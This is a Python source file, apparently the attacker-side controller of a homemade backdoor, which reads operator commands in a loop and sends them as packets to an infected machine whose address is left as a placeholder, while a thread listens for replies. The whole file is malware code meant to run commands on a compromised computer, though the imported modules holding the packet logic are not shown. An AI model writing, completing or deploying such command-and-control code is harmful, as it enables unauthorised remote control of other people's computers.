"""
Author: R3tr0_H4ck
Date: 25/11/2023
Purpose: Holds the main operation of the backdoor in the attacking side
"""
from threading import Thread
import time

from backdoor_gate_control import AttackerGateControl
from backdoor_packet_handler import AttackerPacketHandler
from backdoor_packet_sender import AttackerPacketSender


def start_sending_packets(packet_sender):
	"""
	starts the main operation of the packet sending to the attacked side
	"""
	while True:
		command = input("Enter Command (Ctrl+C To Break)->")
		packet_sender.send_packet(command)
		time.sleep(1)


def main():
	"""
	starts the main opearion on the attacked side
	"""
	attacker_packet_handler = AttackerPacketHandler()
	attacker_gate_control = AttackerGateControl(attacker_packet_handler)
	attacker_gate_control.start_capturing_packet()
	packet_sender = AttackerPacketSender("<BD_INFECTED_PC_IP>")
	Thread(target=attacker_gate_control.wait_for_packet).start()
	try:
		start_sending_packets(packet_sender)
	except KeyboardInterrupt:
		attacker_gate_control.stop_capturing_packet()
		packet_sender.send_packet("END:END")


if __name__ == "__main__":
	main()



